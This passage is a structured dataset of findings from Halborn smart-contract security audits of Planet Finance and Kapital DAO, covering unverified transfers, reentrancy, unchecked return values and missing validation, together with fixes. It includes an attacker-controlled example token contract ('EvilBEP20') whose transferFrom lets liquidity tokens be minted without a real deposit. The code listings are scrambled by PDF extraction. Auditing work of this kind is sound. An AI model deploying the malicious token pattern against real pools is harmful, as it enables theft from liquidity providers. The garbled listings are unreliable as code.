"body": "In order to keep track of users shares in pools, a corresponding amount of liquidity pool tokens is minted to liquidity providers. The exact amount to be minted is calculated based on the declared amount of BEP20 tokens added to the pool. In the addLiquidityPair function Planet Finance use safeTransferFrom from the TransferHelper library to handle the token transfer. This function calls transferFrom in the token contract to actually execute the transfer. However, since the actual amount transferred ie. the delta of previous (before transfer) and current (after transfer) balance is not verified, a malicious user may list a custom BEP20 token with the transferFrom function modified in such a way that it does not transfer any tokens at all and the attacker is still going to have their liquidity pool tokens minted anyway. Code Location: Attacker-controlled example BEP20 token contract Listing 1: EvilBEP20.sol (Lines 10) ) 1 function transferFrom ( address from , 2 address to , 3 uint256 value 4 5 6 7 8 9 10 11 12 public override returns ( bool ) { value = 1; require ( value <= _balances [ from ]) ; require ( value <= _allowed [ from ][ msg . sender ]) ; 16 require ( to != address (0) ) ; _balances [ from ] = _balances [ from ]. sub ( value ); _balances [ to ] = _balances [ to ]. add ( value ); _allowed [ from ][ msg . sender ] = _allowed [ from ][ msg . sender ]. sub ( value ); emit Transfer ( from , to , value ); return true ; 13 14 15 16 17 18 19 20 } PlanetRouter.sol Line #23 Listing 2: PlanetRouter.sol (Lines 25) 23 function safeTransferFrom ( address token , address from , address to , uint value ) internal { // bytes4 ( keccak256 ( bytes (' transferFrom ( address , address , uint256 ) ')) ) ; ( bool success , bytes memory data ) = token . call ( abi . encodeWithSelector (0 x23b872dd , from , to , value )) ; require ( success && ( data . length == 0 || abi . decode ( data , ( bool ))) , ' TransferHelper : TRANSFER_FROM_FAILED '); 24 25 26 27 } PlanetRouter.sol Line #442 Listing 3: PlanetRouter.sol (Lines 456) 442 function addLiquidity ( 443 444 445 446 447 448 449 450 451 ) external virtual override ensure ( deadline ) returns ( uint amountA address tokenA , address tokenB , uint amountADesired , uint amountBDesired , uint amountAMin , uint amountBMin , address to , uint deadline , uint amountB , uint liquidity ) { ( amountA , amountB ) = _addLiquidity ( tokenA , tokenB , amountADesired , amountBDesired , amountAMin , amountBMin ); address pair = PlanetLibrary . pairFor ( factory , tokenA , tokenB ); 452 453 17 454 455 456 457 } TransferHelper . safeTransferFrom ( tokenA , msg . sender , pair , amountA ); TransferHelper . safeTransferFrom ( tokenB , msg . sender , pair , amountB ); liquidity = IPlanetPair ( pair ). mint ( to ); Risk Level: Likelihood - 2 Impact - 5 Recommendation: Whenever tokens are transferred, the delta of the previous (before trans- fer) and current (after transfer) token balance should be verified to match the user-declared token amount. Remediation Plan: MITIGATED: Planet.Finance team proposes remediate this by listing only those pairs on their website which adhere to BEP20 standard and are Thus this is not an issue within the contract and verified by them. also not a threat to the users investment unless they do trade off the website. The issue is reclassified as LOW. 18 ", "labels": ["Halborn", "Planet_Finance", "Severity: Medium"]}, {"title": "OWNER CAN RENOUNCE OWNERSHIP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Planet_Finance_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "As a result, The Owner of the contract is usually the account which deploys the contract. the Owner is able to perform some privileged actions. In the AquaStrategy-4BELT.sol smart contracts, the renounceOwnership function is used to renounce being Owner. Otherwise, if the ownership was not transferred before, the contract will never have an Owner, which is dangerous. Code Location: AquaStrategy-PCS.sol Line #1 Listing 4: AquaStrategy-PCS.sol (Lines 1335) 1335 1336 1337 1338 function renounceOwnership () public virtual onlyOwner { emit OwnershipTransferred ( _owner , address (0) ) ; _owner = address (0) ; } AquaStrategy-4BELT.sol Line #1 Listing 5: AquaStrategy-4BELT.sol (Lines 1326) 1326 1327 1328 1329 function renounceOwnership () public virtual onlyOwner { emit OwnershipTransferred ( _owner , address (0) ) ; _owner = address (0) ; } 19 AquaToken.sol Line #1 Listing 6: AquaToken.sol (Lines 636) 636 637 638 639 function renounceOwnership () public virtual onlyOwner { emit OwnershipTransferred ( _owner , address (0) ) ; _owner = address (0) ; } Risk Level: Likelihood - 2 Impact - 5 Recommendation: Its recommended that the Owner is not able to call renounceOwnership without transferring the Ownership to other address before. In addition, if a multi-signature wallet is used, calling renounceOwnership function should be confirmed for two or more users. As an other solution, Renounce Ownership functionality can be disabled with the following line. AquaStrategy-4BELT.sol Line #1 Listing 7: AquaStrategy-4BELT.sol (Lines 3) 2 3 4 function renounceOwnership () public override onlyOwner { revert ( \" can 't renounceOwnership here \"); // not possible with this smart contract } Remediation Plan: SOLVED: In the constructor parameter, the ownership is transferred to the farm contract at the time of deployment and the farm contract cannot call this function. In addition, Planet.Finance team implements multi-signature wallets. 20 ", "labels": ["Halborn", "Planet_Finance", "Severity: Medium"]}, {"title": "FLOATING PRAGMA", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Planet_Finance_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "PlanetRouter.sol contract use the floating pragma >=0.5.0. Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using another pragma, for example, either an outdated pragma version that might introduce bugs that affect the contract system negatively or a recently released pragma version which has not been extensively tested. Reference: ConsenSys Diligence - Lock pragmas Code Location: PlanetRouter.sol Line #1 Listing 8: PlanetLibrary.sol (Lines 277) 277 pragma solidity >=0.5.0;  This is an example where the floating pragma is used. ^0.5.0. Risk Level: Likelihood - 2 Impact - 3 Recommendation: Consider lock the pragma version known bugs for the compiler version. Therefore, it is recommended not to use floating pragma in the production. Apart from just locking the pragma version in the code, the sign (>= ) need to be removed. it is possible locked the pragma fixing the version both in truffle-config.js if you use the Truffle framework and 21 in hardhat.config.js if you use HardHat framework for the deployment. Remediation Plan: SOLVED: Pragma will be locked before deploying the contract. 22 ", "labels": ["Halborn", "Planet_Finance", "Severity: Low"]}, {"title": "LACK OF MINIMUM THRESHOLD", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Planet_Finance_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "When modifying the MinTimeToWithdraw variable, a check is made in the code which is that the new value must always be smaller than the old value, the problem here is that this variable will always be decreasing and if by mistake the value 0 is injected we cant modify the value of newMinTimeToWithdraw by a value greater than 0. Code Location: AquaStrategy-AQUA.sol Line #1 Listing 9: AquaStrategy-AQUA.sol (Lines 2419) 2419 2420 2421 require ( newMinTimeToWithdraw <= minTimeToWithdrawUL , \" too high \" ); emit minTimeToWithdrawChanged ( minTimeToWithdraw , newMinTimeToWithdraw ); minTimeToWithdraw = newMinTimeToWithdraw Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended performing a limit after the verification is done to check the new value and compare it with 900 seconds which is the value where the miner can manipulate the block.timestamp 23 Remediation Plan: ACKNOWLEDGED: Planet.Finance team considers that this is the expected behaviour, the lower the threshold the better for investors. 24 ", "labels": ["Halborn", "Planet_Finance", "Severity: Low"]}, {"title": "FEE LIMIT DEFINITION MISSING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Planet_Finance_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "During the tests, Halborn Team noticed that on the _mintFee function, limits are not defined. Code Location: PlanetFactory.sol Line #338 Listing 10: PlanetFactory.sol (Lines 338) 338 339 340 341 342 343 344 345 346 347 348 349 350 351 352 353 354 355 356 function _mintFee ( uint112 _reserve0 , uint112 _reserve1 ) private returns ( bool feeOn ) { address feeTo = IPlanetFactory ( factory ). feeTo () ; feeOn = feeTo != address (0) ; uint _kLast = kLast ; // gas savings if ( feeOn ) { if ( _kLast != 0) { uint rootK = Math . sqrt ( uint ( _reserve0 ). mul ( _reserve1 )) ; uint rootKLast = Math . sqrt ( _kLast ); if ( rootK > rootKLast ) { uint numerator = totalSupply . mul ( rootK . sub ( rootKLast )) . mul (12) ; uint denominator = rootK . mul (13) . add ( rootKLast . mul (12) ) ; uint liquidity = numerator / denominator ; if ( liquidity > 0) _mint ( feeTo , liquidity ); } } } else if ( _kLast != 0) { kLast = 0; } } 25 Risk Level: Likelihood - 2 Impact - 3 Recommendation: It is recommended define maximum and minimum fee range on the related function. Remediation Plan: ACKNOWLEDGED: Planet.Finance team defines a fixed percentage of fees which goes to the developers and that depends on the transaction amount. They consider that a fee limit is not necessary. 26 ", "labels": ["Halborn", "Planet_Finance", "Severity: Low"]}, {"title": "USE OF BLOCK.TIMESTAMP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Planet_Finance_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "The contracts PlanetFactory.sol, use block.timestamp. The global variable block.timestamp does not necessarily hold the current time, and may not be accurate. Miners can influence the value of block.timestamp to perform Maximal Extractable Value (MEV) attacks. There is no guarantee that the value is correct, only that it is higher than the previous blocks timestamp. Code Location: PlanetFactory.sol Line #1 Listing 11: PlanetFactory.sol (Lines 188) 187 function permit ( address owner , address spender , uint value , uint deadline , uint8 v , bytes32 r , bytes32 s) external { 188 189 require ( deadline >= block . timestamp , ' Planet : EXPIRED '); bytes32 digest = keccak256 ( PlanetRouter.sol Line #1 Listing 12: PlanetRouter.sol (Lines 400) 399 400 401 402 modifier ensure ( uint deadline ) { require ( deadline >= block . timestamp , ' PlanetRouter : EXPIRED '); _ ; } Recommendation: Use block.number instead of block.timestamp or now to reduce the risk of MEV attacks. Check if the timescale of the project occurs across years, 27 days and months rather than seconds. If possible, it is recommended to use Oracles. Remediation Plan: RISK ACCEPTED: Planet.Finance team considers acceptable the use of block .timestamp. ", "labels": ["Halborn", "Planet_Finance", "Severity: Low"]}, {"title": "FOR LOOP OVER DYNAMIC ARRAY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Planet_Finance_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "Calls inside a loop might lead to a denial-of-service attack. The function discovered is a for loop on variable pid that iterates up to the poolInfo length . If this integer is evaluated at extremely large numbers,this can cause a DoS. Code Location: AquaFarm.sol Line #1 Listing 13: AquaFarm.sol (Lines 1568,1569) uint256 length = poolInfo . length ; for ( uint256 pid = 0; pid < length ; ++ pid ) { 1566 function massUpdatePools () public { 1567 1568 1569 1570 1571 updatePool ( pid ); } } PlanetRouter.sol Line #1 28 Listing 14: PlanetRouter.sol (Lines 341) 341 for ( uint i ; i < path . length - 1; i ++) { 342 ( uint reserveIn , uint reserveOut ) = getReserves ( factory , path [ i ], path [ i + 1]) ; amounts [ i + 1] = getAmountOut ( amounts [i ], reserveIn , reserveOut ); 343 344 345 } } } Listing 15: PlanetRouter.sol (Lines 352) 352 353 354 355 for ( uint i = path . length - 1; i > 0; i - -) { ( uint reserveIn , uint reserveOut ) = getReserves ( factory , path [ i - 1] , path [i ]) ; amounts [ i - 1] = getAmountIn ( amounts [ i], reserveIn , reserveOut ); } Risk Level: Likelihood - 2 Impact - 3 Recommendation: If possible, use pull over push strategy for external calls. Remediation Plan: ACKNOWLEDGED: Planet.Finance team considers that pool length will never be high enough. So, practically it is unlikely. 29 ", "labels": ["Halborn", "Planet_Finance", "Severity: Low"]}, {"title": "ADDRESS VALIDATION MISSING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Planet_Finance_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "Address validation is missing in many functions in which user supplied input is assigned to state variables directly. This could lead to irrecoverable loss of tokens or sensitive contract features. Code Location: AquaStrategy_4BELT.sol Line #2340 Listing 16: AquaStrategy_4BELT.sol (Lines 2342,2347,2348) 2340 function changeFeeAddressSetter ( address payable _newFeeAddressSetter ) public { require ( _msgSender () == feeAddressesSetter ,\" Access Denied \" ); feeAddressesSetter = _newFeeAddressSetter ; 2341 2342 2343 } 2344 2345 function changeFeeAddress ( address _depositFeeAddress , address _withdrawFeeAddress ) public { require ( _msgSender () == feeAddressesSetter ,\" Access Denied \" ); depositFeeAddress = _depositFeeAddress ; withdrawFeeAddress = _withdrawFeeAddress ; 2346 2347 2348 2349 } functions Also and AquaStrategy_AQUA.sol and AquaStrategy_PCS.sol. changeFeeAddressSetter AquaStrategy_4BELT.sol Line #2247 Listing 17: AquaStrategy_4BELT.sol 2247 wbnbAddress = _addresses [0]; 2248 govAddress = _addresses [1]; 2249 aquaFarmAddress = _addresses [2]; 2250 AQUAAddress = _addresses [3]; ChangeFeeAddress in 30 2251 2252 wantAddress = _addresses [4]; 2253 token0Address = _addresses [5]; 2254 token1Address = _addresses [6]; 2255 earnedAddress = _addresses [7]; 2256 2257 farmContractAddress = _addresses [8]; 2258 pid = _pid ; 2259 isCAKEStaking = _isCAKEStaking ; 2260 isSameAssetDeposit = _isSameAssetDeposit ; 2261 isAquaComp = _isAquaComp ; 2262 2263 uniRouterAddress = _addresses [9]; 2264 earnedToAQUAPath = _earnedToAQUAPath ; 2265 earnedToToken0Path = _earnedToToken0Path ; 2266 earnedToToken1Path = _earnedToToken1Path ; 2267 token0ToEarnedPath = _token0ToEarnedPath ; 2268 token1ToEarnedPath = _token1ToEarnedPath ; 2269 2270 controllerFee = _controllerFee ; 2271 rewardsAddress = _addresses [10]; 2272 buyBackRate = _buyBackRate ; 2273 buyBackAddress = _addresses [11]; 2274 entranceFeeFactor = _entranceFeeFactor ; 2275 withdrawFeeFactor = _withdrawFeeFactor ; 2276 2277 belt4PoolAddress = _belt4PoolAddress ; 2278 feeAddressesSetter = _msgSender () ; 2279 transferOwnership ( aquaFarmAddress ); Also constructor functions in changeFeeAddressSetter and ChangeFeeAddress in AquaStrategy _AQUA.sol and AquaStrategy_PCS.sol. AquaFarm.sol Line #1720 Listing 18: AquaFarm.sol (Lines 1721) 1720 function changeAQUAaddress ( address _newAddress ) public onlyOwner { 1721 1722 } AQUA = _newAddress ; PlanetRouter.sol Line #404 31 Listing 19: PlanetRouter.sol (Lines 405,406) 404 constructor ( address _factory , address _WETH ) public { 405 406 407 } factory = _factory ; WETH = _WETH ; Risk Level: Likelihood - 2 Impact - 2 Recommendation: Add proper address validation whenever user-supplied input is assigned to state variables. Ideally, all input should be validated against whitelists. Also, consider implementing relevant setter functions for particularly sensitive variables. Remediation Plan: ACKNOWLEDGED: Planet.Finance team considers that if this happens, they still can change the fees as they can make low level calls through the timelock. 32 ", "labels": ["Halborn", "Planet_Finance", "Severity: Low"]}, {"title": "MISSING EVENT HANDLER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Planet_Finance_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "In the Planet.Finance contract the some of functions do not emit event after the progress. Events are a method of informing the transaction initiator about the actions taken by the called function. It logs its emitted parameters in a specific log history, which can be accessed outside of the contract using some filter parameters. PlanetFactory.sol Line #~488 Listing 20: PlanetFactory.sol (Lines 488,493) 488 489 490 491 492 493 494 495 496 function setFeeTo ( address _feeTo ) external { require ( msg . sender == feeToSetter , ' Planet : FORBIDDEN '); feeTo = _feeTo ; } function setFeeToSetter ( address _feeToSetter ) external { require ( msg . sender == feeToSetter , ' Planet : FORBIDDEN '); feeToSetter = _feeToSetter ; } Risk Level: Likelihood - 2 Impact - 2 Recommendation: Consider as much as possible declaring events at the end of function. Events can be used to detect the end of the operation. 33 Remediation Plan: RISK ACCEPTED: Planet.Finance team accepts the risk. 34 3.10 (HAL-10) IGNORED RETURN VALUES - LOW ", "labels": ["Halborn", "Planet_Finance", "Severity: Informational"]}, {"title": "PROPOSAL LACKS MULTIPLE IMPORTANT LOGIC CHECKS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/PlayGround_Labs_Kapital_DAO_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In Governance.sol contracts, the propose function lacks the multiple logical checks listed below. - Missing to check if the length of the provided targets is equal to values, data length or not. Thus allowing the incorrect submission of the proposals. - No maximum length of targets is defined, which leads to too many actions in a proposal. - No logic is implemented in the proposer if the proposer already has an active or pending proposal in the system before adding a new proposal. - If a description argument is missing from the proposal, it should be used to log the description of the proposal. - Insufficient event emitting, only emitting msg.sender, latestProposalID , and timestamp instead, all essential arguments supplied to the function. Code Location: Listing 1: Governance.sol 138 139 140 141 142 143 144 145 146 function propose ( address [] memory targets , uint256 [] memory values , bytes [] memory data , bool [] memory isDelegateCall , WeightSources memory weightSources ) external returns ( uint256 ) { // Ensure msg . sender has enough voting weight ( uint256 weightKAP , uint256 weightLP ) = getWeights (  weightSources ); 147 148 149 150 require ( weightKAP + convertLP ( weightLP ) >= threshold , \" Governance : Insufficient weight \" ); 15 151 // Make sure haven 't already created a proposal within  cooldown period , Propose CoolDown 152 153 154 uint256 timestamp = block . timestamp ; require ( timestamp >= latestPropose [ msg . sender ] +  proposeCooldown , 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 \" Governance : Propose Cooldown \" ); // Add new proposal latestProposalID ++; Proposal storage proposal = proposals [ latestProposalID ]; proposal . transactParamsHash = getTransactParamsHash ( targets , values , data , isDelegateCall ); proposal . proposeTime = SafeCast . toUint64 ( timestamp ); proposal . priceCumulativeLast = _cumulative () ; // Update msg . sender 's latestProposal latestPropose [ msg . sender ] = timestamp ; emit ProposalCreated ( msg . sender , latestProposalID ,  timestamp ); 174 175 } return latestProposalID ; Risk Level: Likelihood - 4 Impact - 3 Recommendation: Consider adding require checks to ensure array lengths are validated, add a description argument to the above function, and emit the same to log the proposal description for readability; it also emits the events for the remaining arguments, similar to the code shared below. In addition, 16 it is recommended to implement logic to check the proposal status (for example, the status of the proposal could be Pending, Active, Canceled, Defeated, Succeeded, Queued, Expired, Executed, etc.) to the msg.sender, before adding a new proposal. Listing 2 function propose ( ) external returns ( uint256 ) { address [] memory targets , uint256 [] memory values , bytes [] memory data , bool [] memory isDelegateCall , WeightSources memory weightSources , string memory description 1 2 3 4 5 6 7 8 9 ... 10 require ( targets . length > 0 && targets . length == values . length &&  targets . length == data . length && targets . length == isDelegateCall .  length , \" Governor : proposal function information arity mismatch \"); 11 require ( targets . length <= max_operation , \" Governor : too many  actions \" ); 12 ... 13 emit ProposalCreated ( msg . sender , latestProposalID , timestamp ,  targets , values , data , isDelegateCall , weightSources , description )  ; 14 ... Remediation Plan: SOLVED: The Playground labs team solved the above issue in commit 35fb92524b83ff8197a7127f7c9819317ac7ea92. As a result, the team added additional logical checks to the propose function, set proposeCooldown to 3 days (instead of 0 before) to protect against proposal spam, and added a proposal description field and relevant information to the event emitted. Furthermore, the team claims that the use of proposeCooldown is suffi- cient because fast origin-address change is prohibited by the staking requirement and the new delegation-change procedure. Also, the team does not want to limit the target length, as different function calls will use 17 significantly different amounts of gas. Finally, the team claims that the front-end UI will include features such as estimated gas usage and estimated transaction success or failure. Listing 3: Updated propose // Ensure msg . sender has enough voting weight ( uint256 weightKAP , uint256 weightLP ) = getWeights ( address [] memory targets , uint256 [] memory values , bytes [] memory data , string memory description , WeightSources memory weightSources ) external returns ( uint256 ) { require ( function propose ( 1 2 3 4 5 6 7 8 9  weightSources ); 10 11 12 13 14  cooldown period , Propose CoolDown 15 16 17  proposeCooldown , 18 19 20 21 22 23  Invalid data \"); 24  data \" ); 25  description \"); 26 27 28 29 30 31 32 33 targets , values , data weightKAP + convertLP ( weightLP ) >= threshold , \" Governance : Insufficient weight \" ); // Make sure haven 't already created a proposal within uint256 timestamp = block . timestamp ; require ( timestamp >= latestPropose [ msg . sender ] + \" Governance : Propose Cooldown \" ); // Logic check on proposal data uint256 targetsLength = targets . length ; require ( targetsLength > 0, \" Governance : Invalid data \"); require ( targetsLength == values . length , \" Governance : require ( targetsLength == data . length , \" Governance : Invalid require (!( bytes ( description ). length == 0) , \" Governance : No // Add new proposal latestProposalID ++; Proposal storage proposal = proposals [ latestProposalID ]; proposal . transactParamsHash = getTransactParamsHash ( 18 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 ); proposal . proposeTime = SafeCast . toUint64 ( timestamp ); proposal . priceCumulativeLast = _cumulative () ; // Update msg . sender 's latestProposal latestPropose [ msg . sender ] = timestamp ; emit ProposalCreated ( msg . sender , latestProposalID , timestamp , targets , values , data , description ); return latestProposalID ; } 19 ", "labels": ["Halborn", "PlayGround_Labs_Kapital_DAO", "Severity: Medium"]}, {"title": "UNCHECKED TRANSFER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/PlayGround_Labs_Kapital_DAO_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In RewardsLocker.sol, Staking.sol, Vesting.sol contracts, return values from external transfer calls are not checked. It should be noted that the token is not reverted on failure and returns false. If one of these tokens is used, a deposit would not be reverted if the transfer failed and an attacker could deposit tokens for free. Code Location: Listing 4: RewardsLocker.sol (Line 107) function collectRewards ( uint256 lockAgreementId ) external { 91 92  sender ][ 93 94 95  rewards 96 97 98 99 100 LockAgreement storage lockAgreement = lockAgreements [ msg . lockAgreementId ]; // make sure the beneficiary waits before collecting the require ( block . timestamp >= lockAgreement . availableTimestamp , \" Collection too early \" ); // make sure the beneficiary has not already collected the  rewards 101 102 require (! lockAgreement . collected , \" Already collected \"); // set ` collected ` to true , so the beneficiary cannot  withdraw again 103 104 105 106 107 108 } lockAgreement . collected = true ; // update voting weight weightKAP [ msg . sender ] -= lockAgreement . amount ; // transfer ` amount ` KAP to the beneficiary kapToken . transfer ( msg . sender , lockAgreement . amount ); 20 Listing 5: RewardsLocker.sol (Line 120) 115 116 117 118 function transferKap ( address to , uint256 amount ) external { bool senderIsGovernance = ( msg . sender == governanceRegistry . governance () ); bool authorized = senderIsGovernance || hasRole ( KAP_SAVER ,  msg . sender ); 119 120 121 } require ( authorized , \" Access denied \" ); kapToken . transfer ( to , amount ); Listing 6: Staking.sol (Line 456) 451 452 453 454 455 456 457 458 function _transferFromAndReturnAddAmount ( address staker , uint256 inputAmount ) internal returns ( uint256 ) { uint256 previousBalance = asset . balanceOf ( address ( this )) ; asset . transferFrom ( staker , address ( this ) , inputAmount ); return asset . balanceOf ( address ( this )) - previousBalance ; } Listing 7: Staking.sol (Line 248) 226 function unstake ( uint256 removeAmount , uint256  stakingAgreementId ) 227 228 229 external { // update { multipliedTotalRewardsPerWeightLastSync } if  necessary 230 231 232 233 234 235 if ( block . timestamp > lastSync ) { sync () ; } Staker storage staker = stakers [ msg . sender ]; StakingAgreement storage stakingAgreement = staker .  stakingAgreements [ 236 237 238 239 240 stakingAgreementId ]; require ( ( removeAmount > 0) && ( removeAmount <=  stakingAgreement . amount ) , 21 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 \" Staking : Invalid amount \" ); require ( block . timestamp >= stakingAgreement . lockEnd , \" Staking : Too early \" ); asset . transfer ( msg . sender , removeAmount ); staker . totalAmount -= Math . toUint112 ( removeAmount ); stakingAgreement . amount -= Math . toUint112 ( removeAmount ); uint256 unstakeWeight = _calculateStakeWeight ( stakingAgreement . lockEnd - stakingAgreement . lockStart , removeAmount ); totalStakingWeight -= unstakeWeight ; staker . totalWeight -= Math . toUint136 ( unstakeWeight ); // looking at { claimRewards }, the above line has  instantaneously 259 260 // decreased ` claimedRewards ` by // `( unstakeWeight *  multipliedTotalRewardsPerWeightLastSync ) /  REWARDS_PER_WEIGHT_MULTIPLIER `. 261 // we therefore need to give this amount back to the user  in the form 262 263 264 // of adding to ` staker . addRewards `. staker . addRewards += ( unstakeWeight *  multipliedTotalRewardsPerWeightLastSync ) / REWARDS_PER_WEIGHT_MULTIPLIER ; emit Unstake ( msg . sender , removeAmount ); } 265 266 267 268 Listing 8: Vesting.sol (Line 132) function collect ( uint256 vestingAgreementId ) external { VestingAgreement storage vestingAgreement = 95 96  vestingAgreements [ 97 98 99 100 101 msg . sender ][ vestingAgreementId ]; // make sure the vesting period has started require ( block . timestamp > vestingAgreement . vestStart , 22 102 103 104 105 106 \" Vesting not started \" ); // calculate portion of ` totalAmount ` currently unlocked uint256 amountUnlocked ; // if { VESTING_PERIOD } has passed , the entire ` totalAmount  ` is unlocked 107 if ( block . timestamp >= ( vestingAgreement . vestStart +  VESTING_PERIOD )) { 108 109 110 amountUnlocked = vestingAgreement . totalAmount ; } // otherwise , we find the portion of ` totalAmount `  currently available 111 112 113 114  ) / 115 116 117 else { amountUnlocked = ( vestingAgreement . totalAmount * ( block . timestamp - vestingAgreement . vestStart ) VESTING_PERIOD ; } // make sure some of ` amountUnlocked ` has not yet been  collected 118 119 120 121 122 123 124 125 126 127 128 129 require ( amountUnlocked > vestingAgreement . amountCollected , \" Collection limit reached \" ); // calculate amount available for collection uint256 collectionAmount = amountUnlocked - vestingAgreement . amountCollected ; // update balance balances [ msg . sender ] -= collectionAmount ; // update voting weight weightKAP [ delegates [ msg . sender ]] -= collectionAmount ; // update vesting agreement to indicate a collection has  been performed 130 vestingAgreement . amountCollected += SafeCast . toUint96 (  collectionAmount ); 131 132 133 } // transfer KAP tokens available for collection kapToken . transfer ( msg . sender , collectionAmount ); 23 Listing 9: Vesting.sol (Line 75) 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 function createVestingAgreement ( address beneficiary , uint256 vestStart , uint256 amount ) external onlyRole ( VESTING_CREATOR ) { // caller provides KAP for the vesting agreement kapToken . transferFrom ( msg . sender , address ( this ) , amount ); // update balance balances [ beneficiary ] += amount ; // update delegate voting weight weightKAP [ delegates [ beneficiary ]] += amount ; // push a new vesting agreement for the beneficiary vestingAgreements [ beneficiary ]. push ( VestingAgreement ({ vestStart : SafeCast . toUint64 ( vestStart ) , totalAmount : SafeCast . toUint96 ( amount ) , amountCollected : SafeCast . toUint96 (0) }) ); } Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to use SafeERC20 or make sure the return values of transfer and transferFrom are checked. For example, the success check below can ensure a revert on failure. Listing 10 bool success = asset . transferFrom ( staker , address ( this ) , 1  inputAmount ); 2 3 4 } if (! success ) { revert TransferFailed () ; 24 Remediation Plan: SOLVED: The Playground labs team solved the above issue in commit As a result, the team now 35fb92524b83ff8197a7127f7c9819317ac7ea92. uses OpenZeppelins SafeERC20 to perform the transfers. However, the team claims that the tokens used in the Kapital DAO (KAP token and Uniswap V2 Pair) revert on failure, and otherwise return a hardcoded value of true in the above code. 25 ", "labels": ["Halborn", "PlayGround_Labs_Kapital_DAO", "Severity: Low"]}, {"title": "MISSING RE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/PlayGround_Labs_Kapital_DAO_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "One of the contracts included in the scope of Playground Labs Kapital- DAO was identified as missing a nonReentrant guard. In this function, persistent state read/write after an external call is identified, making it vulnerable to a Reentrancy attack.  The Staking.sol contract function unstake is missing nonReentrant guard. To protect against cross-function reentrancy attacks, it may be necessary to use a mutex. By using this lock, an attacker can no longer exploit OpenZeppelin has its own mutex the function with a recursive call. implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against the Reentrancy attacks. Code Location: Listing 11: Staking.sol (Lines 248,249,256,257,263-265) 226 function unstake ( uint256 removeAmount , uint256  stakingAgreementId ) 227 228 229 external { // update { multipliedTotalRewardsPerWeightLastSync } if  necessary 230 231 232 233 234 235 if ( block . timestamp > lastSync ) { sync () ; } Staker storage staker = stakers [ msg . sender ]; StakingAgreement storage stakingAgreement = staker .  stakingAgreements [ 236 stakingAgreementId 26 237 238 239 240 ]; require ( ( removeAmount > 0) && ( removeAmount <=  stakingAgreement . amount ) , 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 \" Staking : Invalid amount \" ); require ( block . timestamp >= stakingAgreement . lockEnd , \" Staking : Too early \" ); asset . transfer ( msg . sender , removeAmount ); staker . totalAmount -= Math . toUint112 ( removeAmount ); stakingAgreement . amount -= Math . toUint112 ( removeAmount ); uint256 unstakeWeight = _calculateStakeWeight ( stakingAgreement . lockEnd - stakingAgreement . lockStart , removeAmount ); totalStakingWeight -= unstakeWeight ; staker . totalWeight -= Math . toUint136 ( unstakeWeight ); // looking at { claimRewards }, the above line has  instantaneously 259 260 // decreased ` claimedRewards ` by // `( unstakeWeight *  multipliedTotalRewardsPerWeightLastSync ) /  REWARDS_PER_WEIGHT_MULTIPLIER `. 261 // we therefore need to give this amount back to the user  in the form 262 263 264 // of adding to ` staker . addRewards `. staker . addRewards += ( unstakeWeight *  multipliedTotalRewardsPerWeightLastSync ) / REWARDS_PER_WEIGHT_MULTIPLIER ; emit Unstake ( msg . sender , removeAmount ); } 265 266 267 268 Risk Level: Likelihood - 1 27 Impact - 4 Recommendation: Change the code to follow the checks-effects-interactions pattern and use ReentrancyGuard via the nonReentrant modifier. Remediation Plan: SOLVED: The Playground labs team solved the above issue in commit As a result, the code now 35fb92524b83ff8197a7127f7c9819317ac7ea92. However, the team follows the checks-effects-interactions pattern. claims that the tokens used in Kapital DAO (KAP token and Uniswap V2 Pair) are not vulnerable to reentrancy into above code. 28 ", "labels": ["Halborn", "PlayGround_Labs_Kapital_DAO", "Severity: Low"]}, {"title": "UNINITIALIZED PROPOSE COOLDOWN", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/PlayGround_Labs_Kapital_DAO_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the Governance.sol contract, the proposeCooldown state variable is not initialized, it defaults to 0 value, and the variable is considered in the other calculation progresses, i.e., require( timestamp >= latestPropose [msg.sender] + proposeCooldown, \"Governance: Propose Cooldown\"); in the propose function. If a variable must be initialized to zero, explicitly set it to zero to improve code readability. Code Location: Listing 12: Governance.sol (Line 23) 23 uint24 public proposeCooldown ; Listing 13: Governance.sol (Line 154) 138 139 140 141 142 143 144 145 146 function propose ( address [] memory targets , uint256 [] memory values , bytes [] memory data , bool [] memory isDelegateCall 